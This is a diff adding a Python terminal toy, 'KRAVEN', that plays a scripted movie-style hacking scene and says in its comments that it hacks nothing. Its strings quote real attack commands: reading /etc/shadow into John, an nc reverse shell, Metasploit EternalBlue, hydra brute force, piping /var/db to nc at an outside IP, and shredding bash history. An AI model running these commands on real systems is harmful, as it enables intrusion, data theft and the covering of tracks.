@@ -1,0 +1,709 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+#  KRAVEN  —  remote intrusion suite  (Hollywood, remastered)
+#
+#  Pantalla de "hackeo" de pelicula para la terminal. NO hackea nada:
+#  es 100% teatro (como el paquete `hollywood` de Kali, pero remasterizado).
+#
+#  Uso:
+#     kraven              # arranca la simulacion (Ctrl+C o q para salir)
+#     kraven --fast       # sin efecto de tipeo, todo mas rapido
+#     kraven --frames N   # renderiza N frames y sale (para pruebas/CI)
+#     kraven --help
+#
+#  Teclas en vivo:
+#     cualquier tecla  ->  inyecta una linea de "codigo" (modo hacker-typer)
+#     ESPACIO          ->  pausa / reanuda
+#     q / Ctrl+C       ->  salir
+#
+#  Solo requiere python3 (libreria estandar). Probado en Kali/Debian/macOS.
+
+import os
+import sys
+import time
+import random
+import shutil
+
+# ----------------------------------------------------------------------------
+# Color helpers (truecolor con degradado a algo razonable en cualquier term)
+# ----------------------------------------------------------------------------
+def fg(r, g, b):
+    return "\033[38;2;{};{};{}m".format(r, g, b)
+
+GREEN  = fg(57, 255, 138)
+GDIM   = fg(31, 122, 72)
+GDEEP  = fg(12, 80, 45)
+CYAN   = fg(49, 230, 255)
+AMBER  = fg(255, 191, 63)
+RED    = fg(255, 51, 85)
+WHITE  = fg(230, 255, 240)
+INK    = fg(143, 253, 192)
+INKD   = fg(63, 138, 99)
+BASE   = fg(40, 90, 66)
+RESET  = "\033[0m"
+
+GLYPHS = list("アカサタナハマヤ0123456789ABCDEF#%$@&*<>=/\\|")
+
+# ----------------------------------------------------------------------------
+# Terminal canvas: compone todo el frame en memoria y lo escribe de una,
+# para eliminar el parpadeo. Cada celda guarda (caracter, color).
+# ----------------------------------------------------------------------------
+class Canvas:
+    def __init__(self, w, h):
+        self.resize(w, h)
+
+    def resize(self, w, h):
+        self.w = max(1, w)
+        self.h = max(1, h)
+        self.ch = [[" "] * self.w for _ in range(self.h)]
+        self.co = [[BASE] * self.w for _ in range(self.h)]
+
+    def clear(self):
+        for y in range(self.h):
+            row = self.ch[y]
+            crow = self.co[y]
+            for x in range(self.w):
+                row[x] = " "
+                crow[x] = BASE
+
+    def put(self, x, y, text, color):
+        if y < 0 or y >= self.h:
+            return
+        row = self.ch[y]
+        crow = self.co[y]
+        xx = x
+        for c in text:
+            if 0 <= xx < self.w:
+                row[xx] = c
+                crow[xx] = color
+            xx += 1
+
+    def segs(self, x, y, segments, maxw):
+        """Dibuja una lista de (texto,color) recortada a maxw."""
+        used = 0
+        cx = x
+        for text, color in segments:
+            if used >= maxw:
+                break
+            room = maxw - used
+            t = text[:room]
+            self.put(cx, y, t, color)
+            cx += len(t)
+            used += len(t)
+
+    def box(self, x, y, w, h, color, title="", tcolor=None):
+        if w < 2 or h < 2:
+            return
+        hz = "─" * (w - 2)
+        self.put(x, y, "┌" + hz + "┐", color)
+        self.put(x, y + h - 1, "└" + hz + "┘", color)
+        for yy in range(y + 1, y + h - 1):
+            self.put(x, yy, "│", color)
+            self.put(x + w - 1, yy, "│", color)
+        if title:
+            self.put(x + 2, y, "┤ ", color)
+            self.put(x + 4, y, title, tcolor or color)
+            self.put(x + 4 + len(title), y, " ├", color)
+
+    def render(self):
+        out = ["\033[H"]
+        for y in range(self.h):
+            cur = None
+            line = []
+            row = self.ch[y]
+            crow = self.co[y]
+            for x in range(self.w):
+                c = crow[x]
+                if c != cur:
+                    line.append(c)
+                    cur = c
+                line.append(row[x])
+            line.append(RESET)
+            out.append("".join(line))
+            if y != self.h - 1:
+                out.append("\n")
+        return "".join(out)
+
+# ----------------------------------------------------------------------------
+# Datos falsos "verosimiles"
+# ----------------------------------------------------------------------------
+def rint(a, b): return random.randint(a, b)
+def rflt(a, b): return random.uniform(a, b)
+def pick(seq):  return random.choice(seq)
+def hexs(n):    return "".join(random.choice("0123456789abcdef") for _ in range(n))
+def ipr():      return "{}.{}.{}.{}".format(rint(11, 223), rint(0, 255), rint(0, 255), rint(1, 254))
+def macr():     return ":".join(hexs(2) for _ in range(6)).upper()
+
+HOSTS = ["mainframe-07.gov", "vault.aegis-bank.net", "scada-plant-04.local",
+         "orion-satlink.mil", "db-core.hexacorp.io", "ns1.darknet.onion"]
+OSES  = ["Linux 5.4 (hardened)", "Windows Server 2019", "VxWorks RTOS",
+         "Debian 11 / grsec", "FreeBSD 13.1"]
+GEOS  = ["Reykjavik, IS", "Zurich, CH", "Singapore, SG", "Langley, US",
+         "Pyongyang, KP", "Tallinn, EE"]
+
+PORTS = [
+    ("22",   "ssh",        "OpenSSH 7.2p2", "CVE-2018-15473", "open"),
+    ("21",   "ftp",        "vsftpd 2.3.4",  "CVE-2011-2523",  "vuln"),
+    ("80",   "http",       "Apache 2.4.29", "-",              "open"),
+    ("443",  "https",      "nginx 1.14.0",  "-",              "open"),
+    ("445",  "smb",        "Samba 3.6.3",   "CVE-2017-7494",  "vuln"),
+    ("3306", "mysql",      "MySQL 5.7.29",  "CVE-2020-2574",  "open"),
+    ("3389", "rdp",        "MS Term Svc",   "CVE-2019-0708",  "vuln"),
+    ("139",  "netbios",    "Samba",         "-",              "open"),
+    ("8080", "http-proxy", "Jetty 9.4",     "CVE-2021-28164", "filt"),
+    ("5900", "vnc",        "RealVNC",       "CVE-2019-15681", "open"),
+    ("6379", "redis",      "Redis 4.0.9",   "unauth",         "vuln"),
+    ("1433", "mssql",      "SQL Server",    "CVE-2020-0618",  "open"),
+    ("53",   "dns",        "bind 9.11",     "-",              "open"),
+]
+
+SNIPPETS = [
+    "for i in $(seq 1 254); do ping -c1 10.0.0.$i & done",
+    "cat /etc/shadow | john --wordlist=rockyou.txt -",
+    "curl -s http://%IP%/admin -H 'X-Forwarded-For: 127.0.0.1'",
+    "sqlmap -u 'http://%IP%/login?id=1' --dbs --batch",
+    "ssh -o StrictHostKeyChecking=no root@%IP%",
+    'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
+    "nc -lvnp 4444 -e /bin/bash   # reverse shell armed",
+    "hashcat -m 1800 -a 0 hashes.txt rockyou.txt --force",
+]
+
+# ----------------------------------------------------------------------------
+# Estado global de la simulacion
+# ----------------------------------------------------------------------------
+class State:
+    def __init__(self):
+        self.frame = 0
+        self.paused = False
+        self.intensity = 0.35
+        # shell
+        self.shell = []          # lista de lineas; cada linea = [(texto,color),...]
+        self.typing = None       # dict {segments_prefix, full, idx, color}
+        self.wait = 0
+        # mision
+        self.m_pct = 0
+        self.m_label = "BOOT"
+        self.m_stage = "cargando payload…"
+        # vitals
+        self.tgt = ipr()
+        self.host = "-"; self.os = "-"; self.geo = "-"; self.mac = "-"
+        self.hops = rint(9, 19)
+        # gauges (valor, objetivo)
+        self.g = {k: [rflt(20, 45), rflt(20, 45)] for k in
+                  ("CPU", "MEM", "NET", "GPU", "CRYPT")}
+        # ports
+        self.pidx = 0
+        self.pscanned = 0
+        self.prows = []          # filas visibles
+        # hex
+        self.hex_off = rint(0x4000, 0x9000) * 16
+        self.hex_lines = []
+        # exfil rate
+        self.exrate = 0
+        # matrix
+        self.mkey = None
+        self.mheads = []
+        self.mspeed = []
+        # banner
+        self.banner = 0          # frames restantes
+        self.banner_deny = False
+        self.g_ip = ""
+
+    def push(self, segments):
+        self.shell.append(segments)
+        if len(self.shell) > 200:
+            self.shell = self.shell[-200:]
+
+S = State()
+
+# ----------------------------------------------------------------------------
+# Guion (state machine): produce comandos / salida / esperas / etapas
+# ----------------------------------------------------------------------------
+def scenario():
+    while True:
+        tgt = ipr()
+        S.tgt = tgt
+        S.hops = rint(9, 19)
+
+        yield ("stage", 4, "RECON", "enumerando objetivo…", 0.3)
+        yield ("cmd", "nmap -sS -sV -T4 --open " + tgt)
+        yield ("out", [("Starting Nmap 7.94 ( https://nmap.org )", INKD)])
+        yield ("out", [("Host is up ", GREEN), ("(0.0021s latency).", INKD)])
+        yield ("wait", 9)
+        yield ("out", [("Discovered open ports: ", AMBER),
+                       ("22,21,80,445,3306,3389", INK)])
+
+        yield ("stage", 18, "FINGERPRINT", "identificando servicios…", 0.45)
+        yield ("cmd", "enum4linux -a " + tgt)
+        yield ("vitals",)
+        yield ("out", [("[+] ", CYAN), ("OS guess: " + S.os, INK)])
+        yield ("out", [("[+] ", CYAN), ("SMB signing: ", INK), ("disabled", RED)])
+        yield ("out", [("[+] ", CYAN), ("Null session: ", INK), ("allowed", RED)])
+        yield ("wait", 8)
+
+        yield ("stage", 34, "EXPLOIT", "seleccionando vector…", 0.7)
+        yield ("cmd", "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue'")
+        yield ("out", [("msf6 > ", INKD), ("set RHOSTS " + tgt, WHITE)])
+        yield ("out", [("msf6 > ", INKD), ("set LHOST 10.10.14.7", WHITE)])
+        yield ("out", [("msf6 > ", INKD), ("exploit", WHITE)])
+        yield ("wait", 6)
+        yield ("out", [("[*] ", AMBER), ("Sending SMB payload… grooming buffer…", INK)])
+
+        yield ("stage", 52, "BRUTE FORCE", "rompiendo credenciales…", 0.9)
+        yield ("cmd", "hydra -l admin -P rockyou.txt " + tgt + " ssh -t 32")
+        bad = ["Passw0rd!", "hunter2", "letmein", "dragon2024",
+               "qwerty!23", "admin@123", "S3cr3t#", "root_toor"]
+        good = ["Tr0ub4dor&3", "Zx#9vQ!kL2", "N3xu5_r00t$"]
+        for i in range(8):
+            n = (i * 4096) + rint(1, 4000)
+            yield ("out", [("try {:>8}  ".format(n), INKD),
+                           ("x ", RED), (pick(bad), INK)])
+        yield ("out", [("try {:>8}  ".format(rint(30000, 40000)), INKD),
+                       ("MATCH -> ", GREEN), (pick(good), WHITE)])
+
+        yield ("stage", 70, "PRIVESC", "escalando a root…", 0.85)
+        yield ("cmd", "./exploit.py --lpe && id")
+        yield ("out", [("[*] ", AMBER),
+                       ("kernel: " + pick(["DirtyPipe", "PwnKit", "DirtyCOW", "OverlayFS"])
+                        + " -> writing /etc/shadow", INK)])
+        yield ("out", [("uid=0(root) gid=0(root) groups=0(root)", GREEN)])
+
+        yield ("stage", 86, "EXFIL", "extrayendo datos…", 1.0)
+        yield ("cmd", "tar czf - /var/db | openssl enc -aes-256-cbc | nc 10.10.14.7 4444")
+        yield ("out", [("-> ", CYAN), ("credentials.kdbx", WHITE),
+                       (" ({}.{} MB)".format(rint(2, 9), rint(1, 9)), INKD)])
+        yield ("out", [("-> ", CYAN), ("private_keys/", WHITE),
+                       (" ({} KB)".format(rint(120, 900)), INKD)])
+        yield ("out", [("-> ", CYAN), ("wallet.dat", WHITE),
+                       (" ({} KB)".format(rint(40, 300)), INKD)])
+        yield ("wait", 7)
+
+        yield ("stage", 96, "CLEANUP", "borrando rastros…", 0.6)
+        yield ("cmd", "shred -u ~/.bash_history && touch -r /bin/ls .")
+        yield ("out", [("logs wiped · timestamps forged · session laundered", INKD)])
+        yield ("wait", 6)
+
+        yield ("stage", 100, "COMPLETE", "objetivo comprometido ✓", 0.9)
+        yield ("banner", False)
+        yield ("out", [("████ ROOT ACCESS SECURED ████", GREEN)])
+        yield ("wait", 10)
+
+        yield ("reset",)
+        yield ("stage", 0, "RE-TARGET", "seleccionando nuevo objetivo…", 0.35)
+        yield ("wait", 8)
+
+GEN = scenario()
+
+def refresh_vitals():
+    S.host = pick(HOSTS)
+    S.os = pick(OSES)
+    S.geo = pick(GEOS)
+    S.mac = macr()
+
+def step_scenario(fast):
+    if S.paused or S.banner > 0:
+        return
+    if S.wait > 0:
+        S.wait -= 1
+        return
+    if S.typing is not None:
+        t = S.typing
+        speed = len(t["full"]) if fast else rint(1, 3)
+        t["idx"] = min(len(t["full"]), t["idx"] + speed)
+        if t["idx"] >= len(t["full"]):
+            S.push(t["prefix"] + [(t["full"], WHITE)])
+            S.typing = None
+            S.wait = 0 if fast else rint(2, 6)
+        return
+    try:
+        item = next(GEN)
+    except StopIteration:
+        return
+    kind = item[0]
+    if kind == "cmd":
+        S.typing = {"prefix": prompt_prefix(), "full": item[1], "idx": 0}
+    elif kind == "out":
+        S.push(item[1])
+        S.wait = 0 if fast else rint(1, 4)
+    elif kind == "wait":
+        S.wait = max(1, item[1] // (3 if fast else 1))
+    elif kind == "vitals":
+        refresh_vitals()
+    elif kind == "stage":
+        _, pct, label, stage, inten = item
+        S.m_pct, S.m_label, S.m_stage, S.intensity = pct, label, stage, inten
+    elif kind == "banner":
+        S.banner = 45
+        S.banner_deny = item[1]
+        S.g_ip = pick(HOSTS) + " · " + ipr()
+    elif kind == "reset":
+        S.shell = []
+        S.prows = []
+        S.pscanned = 0
+
+def prompt_prefix():
+    return [("root@kraven", GREEN), (":", INK), ("~", CYAN), ("# ", GREEN)]
+
+# ----------------------------------------------------------------------------
+# Actualizaciones animadas (independientes del guion)
+# ----------------------------------------------------------------------------
+def update_gauges():
+    inten = S.intensity
+    if S.frame % 14 == 0:
+        base = {"CPU": (30, 50, 45), "MEM": (35, 55, 35), "NET": (20, 45, 50),
+                "GPU": (10, 30, 65), "CRYPT": (25, 55, 40)}
+        for k, (lo, hi, sc) in base.items():
+            S.g[k][1] = rflt(lo, hi) + inten * sc
+    for k in S.g:
+        v, t = S.g[k]
+        v += (t - v) * 0.12 + rflt(-1.5, 1.5)
+        S.g[k][0] = max(2, min(99, v))
+
+def update_ports():
+    if S.paused:
+        return
+    if S.frame % 7 != 0:
+        return
+    if S.pidx >= len(PORTS):
+        S.pidx = 0
+    row = PORTS[S.pidx]
+    S.pidx += 1
+    S.pscanned = min(65535, S.pscanned + rint(1800, 6400))
+    S.prows.append(row)
+    if len(S.prows) > 40:
+        S.prows = S.prows[-40:]
+
+def update_hex():
+    if S.paused:
+        return
+    if S.frame % 2 != 0:
+        return
+    b = [hexs(2) for _ in range(16)]
+    ascii_ = "".join(random.choice(".·#@%x><$") if random.random() < 0.4
+                     else chr(rint(65, 122)) for _ in range(16))
+    line = "{:08x}  {}  {}  |{}|".format(
+        S.hex_off & 0xffffffff, " ".join(b[:8]), " ".join(b[8:]), ascii_)
+    S.hex_off += 16
+    S.hex_lines.append(line)
+    if len(S.hex_lines) > 60:
+        S.hex_lines = S.hex_lines[-60:]
+    if S.frame % 12 == 0:
+        S.exrate = rint(120, 980)
+
+def update_matrix(w, h):
+    key = (w, h)
+    if key != S.mkey:
+        S.mkey = key
+        S.mheads = [rint(-h, 0) for _ in range(max(1, w))]
+        S.mspeed = [rflt(0.4, 1.2) for _ in range(max(1, w))]
+
+# ----------------------------------------------------------------------------
+# Dibujo de paneles
+# ----------------------------------------------------------------------------
+def draw_header(cv, clock):
+    cv.put(0, 0, "─" * cv.w, GDEEP)
+    cv.put(1, 0, "◈", CYAN)
+    cv.put(3, 0, "KRAVEN", GREEN)
+    x = 10
+    for txt, col in [("apex intrusion suite", INKD),
+                     ("[C2 LINK]", GREEN), ("[TOR x7]", AMBER),
+                     ("[IDS EVASION]", RED)]:
+        cv.put(x, 0, txt, col)
+        x += len(txt) + 1
+    right = "OP:BLACKOUT  UID 0  " + clock
+    cv.put(max(x + 1, cv.w - len(right) - 1), 0, right, INK)
+
+def draw_shell(cv, x, y, w, h):
+    cv.box(x, y, w, h, GDIM, "shell", GREEN)
+    iw = w - 4
+    ih = h - 2
+    lines = list(S.shell)
+    if S.typing is not None:
+        t = S.typing
+        lines = lines + [t["prefix"] + [(t["full"][:t["idx"]], WHITE)]]
+    lines = lines[-ih:]
+    for i, segs in enumerate(lines):
+        cv.segs(x + 2, y + 1 + i, segs, iw)
+    if S.typing is not None and (S.frame // 3) % 2 == 0:
+        t = S.typing
+        cur_x = x + 2 + sum(len(s) for s, _ in t["prefix"]) + t["idx"]
+        cv.put(min(cur_x, x + w - 2), y + h - 2, "█", GREEN)
+
+def draw_matrix(cv, x, y, w, h):
+    cv.box(x, y, w, h, GDIM, "datastream", GDIM)
+    iw = w - 2
+    ih = h - 2
+    update_matrix(iw, ih)
+    if S.paused:
+        return
+    for c in range(iw):
+        S.mheads[c] += S.mspeed[c]
+        head = int(S.mheads[c])
+        for tlen in range(0, 6):
+            yy = head - tlen
+            if 0 <= yy < ih:
+                if tlen == 0:
+                    col = WHITE
+                elif tlen == 1:
+                    col = GREEN
+                elif tlen < 3:
+                    col = GDIM
+                else:
+                    col = GDEEP
+                cv.put(x + 1 + c, y + 1 + yy, pick(GLYPHS), col)
+        if head - 6 > ih and random.random() > 0.94:
+            S.mheads[c] = rint(-4, 0)
+
+def bar(cv, x, y, w, label, val):
+    cv.put(x, y, label.ljust(6), INKD)
+    bw = max(4, w - 6 - 6)
+    fill = int(val / 100.0 * bw)
+    col = RED if val > 85 else AMBER if val > 65 else GREEN
+    cv.put(x + 6, y, "[", GDIM)
+    cv.put(x + 7, y, "█" * fill, col)
+    cv.put(x + 7 + fill, y, "░" * (bw - fill), GDEEP)
+    cv.put(x + 7 + bw, y, "]", GDIM)
+    cv.put(x + 8 + bw, y, "{:>3.0f}%".format(val), col)
+
+def draw_telemetry(cv, x, y, w, h):
+    cv.box(x, y, w, h, GDIM, "target vitals · telemetry", GREEN)
+    iw = w - 4
+    row = y + 1
+    def kv(k, v, vcol=INK):
+        nonlocal row
+        if row < y + h - 1:
+            cv.put(x + 2, row, k.ljust(9), INKD)
+            cv.put(x + 2 + 9, row, str(v)[:iw - 9], vcol)
+            row += 1
+    kv("HOST", S.host)
+    kv("OS", S.os)
+    kv("GEO", S.geo)
+    kv("MAC", S.mac)
+    kv("FIREWALL", "BYPASSED", RED)
+    kv("UPLINK", "{}  {} hops".format(S.tgt, S.hops), CYAN)
+    if row < y + h - 1:
+        row += 1
+    for k in ("CPU", "MEM", "NET", "GPU", "CRYPT"):
+        if row < y + h - 1:
+            bar(cv, x + 2, row, iw, k, S.g[k][0])
+            row += 1
+
+def draw_ports(cv, x, y, w, h):
+    title = "port sweep  {:,} / 65535".format(S.pscanned)
+    cv.box(x, y, w, h, GDIM, title, GREEN)
+    iw = w - 4
+    cv.put(x + 2, y + 1, "PORT  STATE  SERVICE".ljust(iw - 16)[:iw], INKD)
+    cv.put(x + w - 2 - 15, y + 1, "CVE", INKD)
+    ih = h - 3
+    rows = S.prows[-ih:]
+    for i, (pt, svc, ver, cve, state) in enumerate(rows):
+        yy = y + 2 + i
+        scol = AMBER if state == "filt" else GREEN
+        stxt = "OPEN" if state == "vuln" else state.upper()
+        cv.put(x + 2, yy, pt.ljust(6), scol)
+        cv.put(x + 8, yy, stxt.ljust(6), scol)
+        cv.put(x + 14, yy, (svc + " " + ver)[:iw - 14 - 15], INK)
+        ccol = RED if cve not in ("-",) else INKD
+        cv.put(x + w - 2 - 15, yy, cve[:15], ccol)
+
+def draw_hex(cv, x, y, w, h):
+    cv.box(x, y, w, h, GDIM, "exfil {} KB/s".format(S.exrate), CYAN)
+    iw = w - 2
+    ih = h - 2
+    for i, line in enumerate(S.hex_lines[-ih:]):
+        cv.put(x + 1, y + 1 + i, line[:iw], INKD)
+        cv.put(x + 1, y + 1 + i, line[:8], GREEN)
+
+def draw_footer(cv):
+    y = cv.h - 1
+    cv.put(0, y, " " * cv.w, BASE)
+    label = "[{}]".format(S.m_label)
+    cv.put(1, y, label, GREEN)
+    px = 1 + len(label) + 1
+    pctstr = "{:>3d}%".format(S.m_pct)
+    stage = S.m_stage
+    right = pctstr + "  " + stage
+    bw = cv.w - px - len(right) - 3
+    if bw > 4:
+        fill = int(S.m_pct / 100.0 * bw)
+        cv.put(px, y, "▐", GDIM)
+        cv.put(px + 1, y, "█" * fill, GREEN)
+        cv.put(px + 1 + fill, y, "░" * (bw - fill), GDEEP)
+        cv.put(px + 1 + bw, y, "▌", GDIM)
+    cv.put(cv.w - len(right) - 1, y, pctstr, GREEN)
+    cv.put(cv.w - len(stage) - 1, y, stage, CYAN)
+
+def draw_banner(cv):
+    deny = S.banner_deny
+    word = "ACCESS DENIED" if deny else "ACCESS GRANTED"
+    sub = ("TRACE DETECTED · REROUTING" if deny
+           else "ROOT SHELL ESTABLISHED · KEYS EXFILTRATED")
+    col = RED if deny else GREEN
+    bw = max(len(word), len(sub), len(S.g_ip)) + 8
+    bh = 7
+    bx = (cv.w - bw) // 2
+    by = (cv.h - bh) // 2
+    for yy in range(by, by + bh):
+        cv.put(bx, yy, " " * bw, BASE)
+    cv.box(bx, by, bw, bh, col, "", col)
+    flick = (S.frame // 2) % 2 == 0
+    wc = col if flick else WHITE
+    cv.put(bx + (bw - len(word)) // 2, by + 2, word, wc)
+    cv.put(bx + (bw - len(sub)) // 2, by + 4, sub, INKD)
+    if S.g_ip:
+        cv.put(bx + (bw - len(S.g_ip)) // 2, by + 5, S.g_ip, CYAN)
+
+# ----------------------------------------------------------------------------
+# Layout + un frame completo
+# ----------------------------------------------------------------------------
+def draw_frame(cv, clock):
+    cv.clear()
+    W, H = cv.w, cv.h
+    if W < 74 or H < 20:
+        msg = "Agranda la terminal (min 74x20) — KRAVEN"
+        cv.put(max(0, (W - len(msg)) // 2), H // 2, msg[:W], AMBER)
+        return
+
+    draw_header(cv, clock)
+    top = 1
+    bottom = H - 2
+
+    Lw = int(W * 0.56)
+    total = bottom - top + 1
+    mtxH = min(9, max(6, total // 3))
+    shellH = total - mtxH
+
+    # columna izquierda
+    draw_shell(cv, 0, top, Lw, shellH)
+    draw_matrix(cv, 0, top + shellH, Lw, mtxH)
+
+    # columna derecha
+    rx = Lw + 1
+    rw = W - rx
+    teleH = min(15, max(9, total // 2))
+    hexH = mtxH
+    portsH = total - teleH - hexH
+    if portsH < 5:
+        portsH = 5
+        teleH = total - portsH - hexH
+    draw_telemetry(cv, rx, top, rw, teleH)
+    draw_ports(cv, rx, top + teleH, rw, portsH)
+    draw_hex(cv, rx, top + teleH + portsH, rw, hexH)
+
+    draw_footer(cv)
+
+    if S.banner > 0:
+        draw_banner(cv)
+
+# ----------------------------------------------------------------------------
+# Entrada de teclado (raw, no bloqueante) — solo si hay TTY
+# ----------------------------------------------------------------------------
+def inject_code():
+    snip = pick(SNIPPETS).replace("%IP%", ipr())
+    S.push(prompt_prefix() + [(snip, WHITE)])
+
+def handle_keys(data):
+    quit_ = False
+    for b in data:
+        ch = chr(b) if b < 128 else "?"
+        if b == 3 or ch in ("q", "Q"):
+            quit_ = True
+        elif ch == " ":
+            S.paused = not S.paused
+        else:
+            inject_code()
+    return quit_
+
+# ----------------------------------------------------------------------------
+# Main
+# ----------------------------------------------------------------------------
+HELP = """KRAVEN — Hollywood remasterizado para la terminal (puro teatro).
+
+  kraven            arranca la simulacion
+  kraven --fast     sin efecto de tipeo, ritmo acelerado
+  kraven --frames N renderiza N frames y sale (pruebas)
+  kraven --help     esta ayuda
+
+Teclas: cualquier tecla = inyecta codigo · ESPACIO = pausa · q / Ctrl+C = salir
+"""
+
+def main():
+    args = sys.argv[1:]
+    if "--help" in args or "-h" in args:
+        sys.stdout.write(HELP)
+        return 0
+    fast = "--fast" in args
+    max_frames = None
+    if "--frames" in args:
+        try:
+            max_frames = int(args[args.index("--frames") + 1])
+        except (IndexError, ValueError):
+            max_frames = 60
+
+    is_tty = sys.stdin.isatty() and sys.stdout.isatty()
+    if max_frames is None and not is_tty:
+        max_frames = 60  # evita colgarse si se ejecuta en un pipe
+
+    old = None
+    if is_tty:
+        import termios
+        import tty
+        old = termios.tcgetattr(sys.stdin)
+        tty.setraw(sys.stdin.fileno())
+        sys.stdout.write("\033[?1049h\033[?25l")  # alt screen + hide cursor
+        sys.stdout.flush()
+
+    size = shutil.get_terminal_size((100, 32))
+    cv = Canvas(size.columns, size.lines)
+    refresh_vitals()
+
+    import select
+    dt = 0.045 if fast else 0.055
+    rc = 0
+    try:
+        while True:
+            # resize
+            size = shutil.get_terminal_size((100, 32))
+            if size.columns != cv.w or size.lines != cv.h:
+                cv.resize(size.columns, size.lines)
+
+            # input
+            if is_tty:
+                r, _, _ = select.select([sys.stdin], [], [], 0)
+                if r:
+                    data = os.read(sys.stdin.fileno(), 64)
+                    if handle_keys(data):
+                        break
+
+            # update
+            step_scenario(fast)
+            update_gauges()
+            update_ports()
+            update_hex()
+            if S.banner > 0:
+                S.banner -= 1
+
+            clock = time.strftime("%Y-%m-%d %H:%M:%SZ", time.gmtime())
+            draw_frame(cv, clock)
+            sys.stdout.write(cv.render())
+            sys.stdout.flush()
+
+            S.frame += 1
+            if max_frames is not None and S.frame >= max_frames:
+                break
+            if not is_tty and max_frames is None:
+                break
+            time.sleep(dt)
+    except KeyboardInterrupt:
+        rc = 0
+    finally:
+        if is_tty and old is not None:
+            import termios
+            sys.stdout.write("\033[?25h\033[?1049l")  # show cursor + main screen
+            sys.stdout.flush()
+            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
+    return rc
+
+if __name__ == "__main__":
+    sys.exit(main())
